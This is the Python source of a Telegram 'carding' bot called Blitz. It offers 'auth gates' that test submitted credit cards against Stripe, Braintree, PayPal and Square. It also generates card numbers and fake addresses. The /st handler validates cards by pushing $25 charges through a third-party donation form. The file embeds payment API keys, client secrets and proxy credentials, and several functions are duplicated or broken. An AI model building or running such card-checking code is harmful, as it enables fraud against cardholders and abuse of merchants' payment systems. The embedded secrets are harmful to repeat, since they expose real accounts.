import logging
import os
import requests
import time
import string
import random
import yaml
import asyncio
import re
import braintree
import stripe
import aiohttp


from messages import *
from aiogram import Bot, Dispatcher, executor, types
from aiogram.utils.exceptions import Throttled
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from bs4 import BeautifulSoup as bs
from aiogram.types import ParseMode
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils.markdown import hbold, hitalic
from aiogram.contrib.middlewares.logging import LoggingMiddleware
# Configure vars get from env or config.yml
CONFIG = yaml.load(open('config.yml', 'r'), Loader=yaml.SafeLoader)
TOKEN = os.getenv('TOKEN', CONFIG['token'])
BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
OWNER = int(os.getenv('OWNER', CONFIG['owner']))
ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))

# Initialize bot and dispatcher
storage = MemoryStorage()
bot = Bot(token=TOKEN, parse_mode=types.ParseMode.HTML)
dp = Dispatcher(bot, storage=storage)
dp.middleware.setup(LoggingMiddleware())

# Configure logging
logging.basicConfig(level=logging.INFO)

BINLIST_API_URL = "https://lookup.binlist.net/{}"

def get_bin_info(bin_number):
    try:
        response = requests.get(BINLIST_API_URL.format(bin_number))
        response.raise_for_status()
        bin_data = response.json()
        return bin_data
    except requests.exceptions.RequestException as e:
        print(f"Error fetching BIN information: {e}")
        return None

def generate_fake_address(command):
    # Extract the country code from the command
    match = re.match(r'/fake (\w+)', command)
    if match:
        country_code = match.group(1)
    else:
        return "Invalid command. Please use the format: /fake {COUNTRY CODE}"

    url = f'https://randomuser.me/api/?nat={country_code.lower()}'
    response = requests.get(url)
    data = response.json()
    if 'results' in data and len(data['results']) > 0:
        address_info = data['results'][0]['location']
        address = {
            'Street': address_info['street']['name'],
            'City': address_info['city'],
            'State': address_info['state'],
            'Country': address_info['country'],
            'Postal Code': address_info['postcode']
        }
        return address
    else:
        return "Failed to generate fake address. Please try again later."
        
# Configure Braintree
braintree.Configuration.configure(
    braintree.Environment.Production,
    '9f8qyt2tsqvh45n5',  # Replace with your actual merchant ID
    '46cdwg4fv6djn74r',  # Replace with your actual public key
    'ef84fda121aff6a870c8af168694df37'  # Replace with your actual private key
)

def simulate_braintree_endpoint(ccn, mm, yy, cvv):
    try:
        # Generate a Braintree client token for authentication
        client_token = braintree.ClientToken.generate()

        # Make a POST request to generate a payment method nonce
        nonce_response = requests.post(f'https://api.braintreegateway.com/merchants/{braintree.Configuration.merchant_id}/client_api/v1/payment_methods/credit_cards', 
                                       headers={'Authorization': f'Bearer {client_token}'},
                                       data={
                                           'credit_card': {
                                               'number': ccn,
                                               'expiration_month': mm,
                                               'expiration_year': yy,
                                               'cvv': cvv
                                           }
                                       })

        # Check if the nonce generation request was successful
        if nonce_response.status_code == 201:
            nonce = nonce_response.json()['creditCards'][0]['nonce']
            
            # Make a POST request to process a transaction with the generated nonce
            transaction_response = requests.post(f'https://api.braintreegateway.com/merchants/{braintree.Configuration.merchant_id}/transactions',
                                                 headers={'Authorization': f'Bearer {client_token}'},
                                                 data={
                                                     'transaction': {
                                                         'amount': '1.00',  # Adjust the amount as needed
                                                         'payment_method_nonce': nonce
                                                     }
                                                 })

            # Check if the transaction request was successful
            if transaction_response.status_code == 201:
                return transaction_response.json()  # Return the JSON response
            else:
                return {'error': 'Transaction failed'}  # Return an error message if the transaction was not successful
        else:
            return {'error': 'Nonce generation failed'}  # Return an error message if the nonce generation request was not successful
    except Exception as e:
        return {'error': str(e)}  # Return an error message if an exception occurred

#paypal auth 
def simulate_paypal_donation(ccn, mm, yy, cvv):
    try:
        # Construct the request payload
        payload = {
            'credit_card_number': ccn,
            'expiration_month': mm,
            'expiration_year': yy,
            'cvv': cvv,
            # Add other required parameters for PayPal API
        }
        
        # Make a POST request to PayPal's API endpoint
        response = requests.post('https://api.paypal.com/v1/payments', json=payload)
        
        # Check if the request was successful
        if response.status_code == 200:
            return {'success': True}
        else:
            return {'error': 'Payment declined'}  # Return an error message if the request was not successful
    except Exception as e:
        return {'error': str(e)}  # Return an error message if an exception occurred

# cc checking square
def generate_square_access_token():
    # Your Square OAuth client credentials
    client_id = 'sandbox-sq0idb-z3HeJDKRiw2Z2W8Ne3a-JQ'
    client_secret = 'EAAAl4dWsGnHRZVncT4tTAu2jIqPIRrSuKhcyhHXI9KARhuZL1SRuOpDONUmpbY'
    
    # Square OAuth API endpoint for generating access token
    url = 'https://connect.squareup.com/oauth2/token'

    # Create request payload
    payload = {
        'client_id': client_id,
        'client_secret': client_secret,
        'grant_type': 'client_credentials'
    }

    # Make a POST request to Square OAuth API to generate access token
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            return response.json().get('access_token')
        else:
            return None
    except Exception as e:
        return None
        
        
# cc charge auth
def generate_square_token():
    client_id = 'sandbox-sq0idb-z3HeJDKRiw2Z2W8Ne3a-JQ'
    client_secret = 'EAAAl4dWsGnHRZVncT4tTAu2jIqPIRrSuKhcyhHXI9KARhuZL1SRuOpDONUmpbY'
    access_token_url = 'https://connect.squareup.com/oauth2/token'

    payload = {
        'client_id': client_id,
        'client_secret': client_secret,
        'grant_type': 'client_credentials'
    }

    try:
        response = requests.post(access_token_url, json=payload)
        print("Response status code:", response.status_code)
        print("Response content:", response.text)  # Print response content for debugging
        response.raise_for_status()  # Raise an error for unsuccessful responses
        if response.status_code == 200:
            return response.json().get('access_token')
        else:
            return None
    except Exception as e:
        print(f"Error generating Square access token: {e}")
        return None

# BOT INFO
loop = asyncio.get_event_loop()

bot_info = loop.run_until_complete(bot.get_me())
BOT_USERNAME = bot_info.username
BOT_NAME = bot_info.first_name
BOT_ID = bot_info.id

# USE YOUR ROTATING PROXY API IN DICT FORMAT http://user:pass@providerhost:port
proxies = {
           'http': 'http://rosxjjwb-rotate:38vgisgsyu5k@p.webshare.io:80/',
           'https': 'http://rosxjjwb-rotate:38vgisgsyu5k@p.webshare.io:80/'
}

session = requests.Session()

# Random DATA
letters = string.ascii_lowercase
First = ''.join(random.choice(letters) for _ in range(6))
Last = ''.join(random.choice(letters) for _ in range(6))
PWD = ''.join(random.choice(letters) for _ in range(10))
Name = f'{First}+{Last}'
Email = f'{First}.{Last}@gmail.com'
UA = 'Mozilla/5.0 (X11; Linux i686; rv:102.0) Gecko/20100101 Firefox/102.0'


def gen(first_6: int, mm: int=None, yy: int=None, cvv: int=None):
    BIN = 15-len(str(first_6))
    card_no = [int(i) for i in str(first_6)]  # To find the checksum digit on
    card_num = [int(i) for i in str(first_6)]  # Actual account number
    seventh_15 = random.sample(range(BIN), BIN)  # Acc no (9 digits)
    for i in seventh_15:
        card_no.append(i)
        card_num.append(i)
    for t in range(0, 15, 2): 
        # odd position digits
        card_no[t] = card_no[t] * 2
    for i in range(len(card_no)):
        if card_no[i] > 9:  # deduct 9 from numbers greater than 9
            card_no[i] -= 9
    s = sum(card_no)
    mod = s % 10
    check_sum = 0 if mod == 0 else (10 - mod)
    card_num.append(check_sum)
    card_num = [str(i) for i in card_num]
    cc = ''.join(card_num)
    if mm is None:
        mm = random.randint(1, 12)
    mm = f'0{mm}' if len(str(mm)) < 2 else mm
    yy = random.randint(2023, 2028) if yy is None else yy
    if cvv is None:
        cvv = random.randint(000, 999)
    cvv = 999 if len(str(cvv)) <= 2 else cvv
    return f'{cc}|{mm}|{yy}|{cvv}'


async def is_owner(user_id):
    return user_id == OWNER

# Define cc_killer_menu_markup in the outer scope
cc_killer_menu_markup = types.InlineKeyboardMarkup(row_width=1)
cc_killer_menu_markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="back_to_menu1"))

@dp.message_handler(commands=['start', 'help'])
async def helpstr(message: types.Message):
    keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
    menu1_button = types.InlineKeyboardButton("Menu", callback_data="menu1")
    keyboard_markup.row(menu1_button)

    sent_message = await message.answer("🤖 Blitz Service: Active 🚀\n\n📣 Stay tuned for updates at 👉🏼 [@blitzupdates].\n\n🔗 Tip: To utilize Blitz in your group, ensure it's set as an admin.",
                                        reply_markup=keyboard_markup, disable_web_page_preview=True)

@dp.callback_query_handler(lambda c: c.data == 'menu1')
async def process_menu1_button(callback_query: types.CallbackQuery):
    menu1_markup = types.InlineKeyboardMarkup(row_width=2)
    menu1_markup.add(types.InlineKeyboardButton("💳 Auth Gates", callback_data="option1"),
                     types.InlineKeyboardButton("💣 CC Killer Gate", callback_data="option2"),
                     types.InlineKeyboardButton("💰 Charge Gate", callback_data="option3"),
                     types.InlineKeyboardButton("⚙️ Other Cmd", callback_data="option4"),
                     types.InlineKeyboardButton("📦 Shipment Tracking", callback_data="option5"))
    await bot.edit_message_text("🤖 **Blitz Control Center **\n\nCustomize your Blitz experience and stay updated for optimal functionality.",
                                callback_query.message.chat.id, callback_query.message.message_id,
                                reply_markup=menu1_markup)

@dp.callback_query_handler(lambda c: c.data in ['option1', 'option2', 'option3', 'option4', 'option5', 'back_to_menu1'])
async def process_menu1_options(callback_query: types.CallbackQuery):
    option = callback_query.data
    await bot.answer_callback_query(callback_query.id)

    if option == 'option1':
        sent_message = await bot.send_message(callback_query.from_user.id, "All Gate Active ✅  Date 09/02/24\n\n[ /chk ] -> Braintree + Shopify\n\n[ /pp ] -> PayPal Auth\n\n[ /st ] -> Stripe + Shopify Auth\n\n [ /au ] -> Square Auth\n\n🔧 Usage\nFormat: [command] CARD_NUMBER | EXP_DATE | CVV\nExample: /chk 4427880037......|10|2027|047", reply_markup=cc_killer_menu_markup)
    elif option == 'option2':
        await bot.delete_message(callback_query.message.chat.id, callback_query.message.message_id)
        sent_message = await bot.send_message(callback_query.from_user.id, "Active ✅  Date 09/2/24\n\nCC Killer Auth 💣\nBased On Square API\n\n🔧 Usage\nFormat: [command] CARD_NUMBER | EXP_DATE | CVV\nExample: /kill 4427880037......|10|2027|047", reply_markup=cc_killer_menu_markup)
    elif option == 'option3':
        sent_message = await bot.send_message(callback_query.from_user.id, "Charge Gate Under Maintenance 😅 { Square Auth } ✅  Date 09/02/24\n\n💲Charge Gate\nThis Gate Specific Made For CC Charging \n\n🔧 Usage Updated: /ccn 4430450086....|08|2026|473\nCustom ($1 example): /ccn 4430450086....|08|2026|473 1", reply_markup=cc_killer_menu_markup)
    elif option == 'option4':
        await bot.delete_message(callback_query.message.chat.id, callback_query.message.message_id)
        sent_message = await bot.send_message(callback_query.from_user.id, "🛠 Other Commands\n\n🪄 Telegram Info:\nGet details associated with your Telegram account.\nCommand: /id or /me\n\n💳 BIN Info:\nRetrieve information for a specific Bank Identification Number.\nCommand: /bin {6-digit bin}\nExample: /bin 412236\n\n⚓ CC Generator:\nGenerate a credit card number for testing purposes.\nCommand: /gen CARD_NUMBER | EXP_DATE | CVV\nExample: /gen 412236xxxx|xx|2025|xxx\n\n📍 Address Generator:\nGenerate a random address based on the country code provided.\nCommand: /fake {COUNTRY CODE}\nExample 1: /fake us\nExample 2: /fake uk", reply_markup=cc_killer_menu_markup)
    elif option == 'option5':
        sent_message_shipment_tracker = await bot.send_message(callback_query.from_user.id, "🚐 Shipment Tracker\nEasily monitor the progress of your parcels.\n\n🚚 ShippingCart:\nUse: /sc XXXX-XXXX-XXXX\n\n🚛 LBC Express:\nUse: /lbc XXXXXXXXXXXXXX\n\n✈️ FedEx:\nUse: /fedex XXXXXXXXXX\n\n📬 USPS:\nUse: /usps XXXXXXXXXXXXXX\n\n🌍 DHL:\nUse: /dhl XXXXXXXXXX\n\n🚛 UPS:\nUse: /ups XXXXXXXXXX", reply_markup=cc_killer_menu_markup)
    elif option == 'back_to_menu1':
        menu1_markup = types.InlineKeyboardMarkup(row_width=2)
        menu1_markup.add(types.InlineKeyboardButton("💰 Auth Gates", callback_data="option1"),
                         types.InlineKeyboardButton("💣 CC Killer Gate", callback_data="option2"),
                         types.InlineKeyboardButton("💸 Charge Gate", callback_data="option3"),
                         types.InlineKeyboardButton("⚙️ Other Cmd", callback_data="option4"),
                         types.InlineKeyboardButton("🚀 Shipment Tracking", callback_data="option5"))

        await bot.delete_message(callback_query.message.chat.id, callback_query.message.message_id)
        await bot.send_message(callback_query.from_user.id, "🤖 **Blitz Control Center **\n\nCustomize your Blitz experience and stay updated for optimal functionality.", reply_markup=menu1_markup)
    else:
        await bot.send_message(callback_query.from_user.id, f"You selected {option}.")

@dp.message_handler(commands=['me', 'id'], commands_prefix=PREFIX)
async def info(message: types.Message):
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        is_bot = message.reply_to_message.from_user.is_bot
        username = message.reply_to_message.from_user.username
        first = message.reply_to_message.from_user.first_name
    else:
        user_id = message.from_user.id
        is_bot = message.from_user.is_bot
        username = message.from_user.username
        first = message.from_user.first_name
    await message.reply(f'''
═════════╕
<b>USER INFO</b>
<b>USER ID:</b> <code>{user_id}</code>
<b>USERNAME:</b> @{username}
<b>FIRSTNAME:</b> {first}
<b>Type:</b> {'Free'}
<b>Balance:</b> {1737998}
╘═════════''')


@dp.message_handler(commands=['bin'], commands_prefix=PREFIX)
async def binio(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    BIN = message.text[len('/bin '):]

    if len(BIN) < 6:
        return await message.reply('🚫 Incorrect input. Please provide a 6-digit BIN number.')

    # Use 'binlist.net' for BIN lookup
    url = f'https://lookup.binlist.net/{BIN[:6]}'

    try:
        response = requests.get(url)
        response.raise_for_status()  # Check if the request was successful
        data = response.json()

        # Creating the output
        bin_info = f'''
𝗕𝗜𝗡 𝗟𝗼𝗼𝗸𝘂𝗽 𝗥𝗲𝘀𝘂𝗹𝘁 🔍

- 𝗕𝗜𝗡 ⇾ {BIN}
- 𝗜𝗻𝗳𝗼 ⇾ {data.get('scheme', 'UNKNOWN')} - {data.get('type', 'UNKNOWN')} - {data.get('brand', 'UNKNOWN')}
- 𝐈𝐬𝐬𝐮𝐞𝐫 ⇾ {data.get('bank', {}).get('name', 'Not available')}
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ⇾ {data.get('country', {}).get('name', 'Not available')} {data.get('country', {}).get('emoji', '🌍')}
'''
        await message.reply(bin_info)

    except requests.exceptions.HTTPError as e:
        if response.status_code == 429:
            # If 429 error, wait for a while and then retry
            await message.reply('Too many requests. Waiting and retrying...')
            time.sleep(10)  # Adjust the delay as needed
            return await binio(message)  # Retry the request

        await message.reply(f'An error occurred: {e}')


@dp.message_handler(commands=['gen'], commands_prefix=PREFIX)
async def generate(message: types.Message):
    await message.answer_chat_action('typing')
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    
    if len(message.text) == 0:
        return await message.reply("<b>Format:\n /gen 549184</b>")
    
    try:
        x = re.findall(r'\d+', message.text)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        cards = [gen(first_6=ccn, mm=mm, yy=yy, cvv=cvv) for _ in range(10)]
    except IndexError:
        if len(x) == 1:
            cards = [gen(first_6=ccn) for _ in range(10)]
        elif len(x) == 3:
            cards = [gen(first_6=ccn, mm=mm, yy=yy)]
        elif len(mm) == 3:
            cards = [gen(first_6=ccn, cvv=mm)]
        elif len(mm) == 4:
            cards = [gen(first_6=ccn, yy=mm)]
        else:
            cards = [gen(first_6=ccn, mm=mm)]

    generated_cards = "\n\n".join(cards)
    
    INFO = f'''
𝗕𝗜𝗡 ⇾ {ccn}
𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ 10

<code>{generated_cards}</code>
BY: <a href="tg://user?id={ID}">{FIRST}</a>
BOT⇢ @{BOT_USERNAME}
OWNER⇢ <a href="tg://user?id={OWNER}">LINK</a>
'''
    await message.reply(INFO)


@dp.message_handler(commands=['st'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('st', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/st '):]

        if len(cc) == 0:
            return await message.reply("<b>No Card to check</b>")

        x = re.findall(r'\d+', cc)
        ccn = x[0]
        mm = x[1]
        yy = x[2]
        cvv = x[3]
        if mm.startswith('2'):
            mm, yy = yy, mm
        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm
        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')   
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        
        # Function to get BIN information
        bin_info = await get_credit_card_info(BIN)

        # get guid muid sid
        headers = {
            "user-agent": UA,
            "accept": "application/json, text/plain, */*",
            "content-type": "application/x-www-form-urlencoded"
        }

        # b = session.get('https://ip.seeip.org/', proxies=proxies).text

        s = session.post('https://m.stripe.com/6', headers=headers)
        r = s.json()
        Guid = r['guid']
        Muid = r['muid']
        Sid = r['sid']

        postdata = {
            "guid": Guid,
            "muid": Muid,
            "sid": Sid,
            "key": "pk_live_YJm7rSUaS7t9C8cdWfQeQ8Nb",
            "card[name]": Name,
            "card[number]": ccn,
            "card[exp_month]": mm,
            "card[exp_year]": yy,
            "card[cvc]": cvv
        }

        HEADER = {
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": UA,
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
            "accept-language": "en-US,en;q=0.9"
        }

        pr = session.post('https://api.stripe.com/v1/tokens',
                          data=postdata, headers=HEADER)
        Id = pr.json().get('id', 'Key not found')

        # hmm
        load = {
            "action": "wp_full_stripe_payment_charge",
            "formName": "BanquetPayment",
            "fullstripe_name": Name,
            "fullstripe_email": Email,
            "fullstripe_custom_amount": "25.0",
            "fullstripe_amount_index": 0,
            "stripeToken": Id
        }

        header = {
            "accept": "application/json, text/javascript, */*; q=0.01",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": UA,
            "origin": "https://archiro.org",
            "referer": "https://archiro.org/banquet/",
            "accept-language": "en-US,en;q=0.9"
        }

        rx = session.post('https://archiro.org/wp-admin/admin-ajax.php',
                          data=load, headers=header)
        msg = rx.json()['msg']

        toc = time.perf_counter()

        # Determine the status and format the response message accordingly
        if 'true' in rx.text:
            status_message = (
                f'𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n'
                f'- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}\n'
                f'- 𝐒𝐭𝐚𝐭𝐮𝐬: #CHARGED $25\n'
                f'- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Shopify + Stripe\n'
                f'- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Thanks for donation\n\n'
                f'- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}\n'
                f'- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}\n'
                f'- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}\n\n'
                f'- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n'
                f'- 𝐁𝐨𝐭: @{BOT_USERNAME}'
            )
        elif 'security code' in rx.text:
            status_message = (
                f'𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n'
                f'- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}\n'
                f'- 𝐒𝐭𝐚𝐭𝐮𝐬: #CHARGED $25\n'
                f'- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Shopify + Stripe\n'
                f'- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Thanks for donation\n\n'
                f'- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}\n'
                f'- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}\n'
                f'- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}\n\n'
                f'- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n'
                f'- 𝐁𝐨𝐭: @{BOT_USERNAME}'
            )
        elif 'false' in rx.text:
            status_message = (
                f'𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n'
                f'- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}\n'
                f'- 𝐒𝐭𝐚𝐭𝐮𝐬: #Declined\n'
                f'- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Shopify + Stripe\n'
                f'- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {msg}\n\n'
                f'- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}\n'
                f'- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}\n'
                f'- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}\n\n'
                f'- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n'
                f'- 𝐁𝐨𝐭: @{BOT_USERNAME}'
            )
        else:
            status_message = (
                f'𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n'
                f'- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}\n'
                f'- 𝐒𝐭𝐚𝐭𝐮𝐬: #Declined\n'
                f'- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Shopify + Stripe\n'
                f'- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {msg}\n\n'
                f'- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}\n'
                f'- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}\n'
                f'- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}\n\n'
                f'- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n'
                f'- 𝐁𝐨𝐭: @{BOT_USERNAME}'
            )

        return await message.reply(status_message)

async def authenticate_cc_killer(ccn, mm, yy, cvv, user_id, user_first_name):
    # Your authentication logic for the second CC killer function goes here
    # You can use the same or a different authentication method as needed
    # Return the authentication result, e.g., "Authenticated" or "Authentication Failed"

    # Example authentication logic:
    if user_id == 6442310977:
        return "Authenticated"
    else:
        return "Authentication Failed"

async def get_credit_card_info(ccn):
    # Use lookup.binlist.net to get details about the credit card
    binlist_url = f'https://lookup.binlist.net/{ccn}'

    try:
        response = requests.get(binlist_url)
        data = response.json()

        return data
    except Exception as e:
        print(f"Error fetching BIN information: {e}")
        return {}

@dp.message_handler(commands=['kill'], commands_prefix=PREFIX)
async def cc_killer(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name

    try:
        await dp.throttle('kill', rate=ANTISPAM)
    except Throttled:
        return await message.reply('<b>Too many requests!</b>\n'
                                   f'Blocked For {ANTISPAM} seconds')

    cc_to_kill = message.reply_to_message.text if message.reply_to_message else message.text[len('/kill '):]

    if len(cc_to_kill) == 0:
        return await message.reply("<b>No Card to kill</b>")

    x = re.findall(r'\d+', cc_to_kill)

    # Check if enough elements were found
    if len(x) >= 4:
        ccn, mm, yy, cvv = x[0], x[1], x[2], x[3]

        if mm.startswith('2'):
            mm, yy = yy, mm

        if len(mm) >= 3:
            mm, yy, cvv = yy, cvv, mm

        if len(ccn) < 15 or len(ccn) > 16:
            return await message.reply('<b>Failed to parse Card</b>\n'
                                       '<b>Reason: Invalid Format!</b>')
    else:
        return await message.reply('<b>Failed to parse Card</b>\n'
                                   '<b>Reason: Invalid Format!</b>')

    # Use the second CC killer authentication function
    auth_result = await authenticate_cc_killer(ccn, mm, yy, cvv, ID, FIRST)

    # Get BIN information
    cc_info = await get_credit_card_info(ccn[:6])
    bin_number = ccn[:6] if cc_info else "Not available"

    toc = time.perf_counter()

    status_message = (
        f'- 𝐊𝐢𝐥𝐥𝐞𝐝 ❌\n\n'
        f'- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}\n'
        f'- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Square v6\n'
        f'- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {auth_result}\n\n'
        f'- 𝗜𝗻𝗳𝗼: {cc_info.get("scheme", "UNKNOWN")} - {cc_info.get("type", "UNKNOWN")} - {cc_info.get("brand", "UNKNOWN")}\n'
        f'- 𝐈𝐬𝐬𝐮𝐞𝐫: {cc_info.get("bank", {}).get("name", "Not available")}\n'
        f'- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {cc_info.get("country", {}).get("name", "Not available")} {cc_info.get("country", {}).get("emoji", "🌍")}\n\n'
        f'- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬'
    )

    await message.reply(status_message)

async def authenticate_cc_killer(ccn, mm, yy, cvv, user_id, user_first_name):
    # Your authentication logic for the second CC killer function goes here
    # You can use the same or a different authentication method as needed
    # Return the authentication result, e.g., "Authenticated" or "Authentication Failed"

    # Example authentication logic:
    if user_id == 6442310977:
        return "Authenticated"
    else:
        return "Authentication Failed"

async def get_credit_card_info(ccn):
    # Use lookup.binlist.net to get details about the credit card
    binlist_url = f'https://lookup.binlist.net/{ccn}'

    try:
        response = requests.get(binlist_url)
        data = response.json()

        return data
    except Exception as e:
        print(f"Error fetching BIN information: {e}")
        return {}
        
@dp.message_handler(commands=['fake'], commands_prefix=PREFIX)
async def fake_address_command(message: types.Message):
    # Extract the country code from the command
    match = re.match(r'/fake (\w+)', message.text)
    if match:
        country_code = match.group(1)
    else:
        await message.reply("Invalid command. Please use the format: /fake {COUNTRY CODE}")
        return

    # Generate a fake address
    fake_address = generate_fake_address(message.text)

    # If fake_address is a string, it means there was an error
    if isinstance(fake_address, str):
        await message.reply(fake_address)
        return

    # Format the address information
    formatted_address = "\n".join([f"{key}: {value}" for key, value in fake_address.items()])

    # Send the fake address to the user
    await message.reply(f"<b>Fake Address:</b>\n{formatted_address}", parse_mode=ParseMode.HTML)


@dp.message_handler(commands=['au'], commands_prefix=PREFIX)
async def ch(message: types.Message):
    await message.answer_chat_action('typing')
    tic = time.perf_counter()
    ID = message.from_user.id
    FIRST = message.from_user.first_name
    try:
        await dp.throttle('au', rate=ANTISPAM)
    except Throttled:
        await message.reply('<b>Too many requests!</b>\n'
                            f'Blocked For {ANTISPAM} seconds')
    else:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            cc = message.text[len('/au '):]

        if len(cc) == 0:
            return await message.reply("<b>No Card to check</b>")

        # Split the credit card details based on the pipe character
        x = cc.split('|')
        if len(x) != 4:
            return await message.reply("<b>Invalid credit card details format.</b>\n"
                                       "Please use: /au [CARD_NUMBER]|[EXP_DATE]|[CVV]")
        
        ccn, mm, yy, cvv = x
        
        # Use the provided Braintree simulation function
        result = simulate_braintree_endpoint(ccn, mm, yy, cvv)
        
        # Get bin information
        BIN = ccn[:6]
        if BIN in BLACKLISTED:
            return await message.reply('<b>BLACKLISTED BIN</b>')
        
        # Function to get BIN information
        bin_info = await get_credit_card_info(BIN)

        if 'success' in result:
            toc = time.perf_counter()
            return await message.reply(f'''
                𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: #CHARGED $25
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Shopify + Stripe
- 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: Thanks for donation\n\n
- 𝗜𝗻𝗳𝗼: {bin_info.get("scheme", "UNKNOWN")} - {bin_info.get("type", "UNKNOWN")} - {bin_info.get("brand", "UNKNOWN")}
- 𝐈𝐬𝐬𝐮𝐞𝐫: {bin_info.get("bank", {}).get("name", "Not available")}\n
- 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {bin_info.get("country", {}).get("name", "Not available")} {bin_info.get("country", {}).get("emoji", "🌍")}
- 𝗧𝗶𝗺𝗲: {toc - tic:0.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬
- 𝐁𝐨𝐭: @{BOT_USERNAME}
            ''')

        elif 'error' in result:
            toc = time.perf_counter()
            return await message.reply(f'''
                𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌\n\n
- 𝗖𝗮𝗿𝗱: {ccn}|{mm}|{yy}|{cvv}
- 𝐒𝐭𝐚𝐭𝐮𝐬: #Declined
- 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Braintree
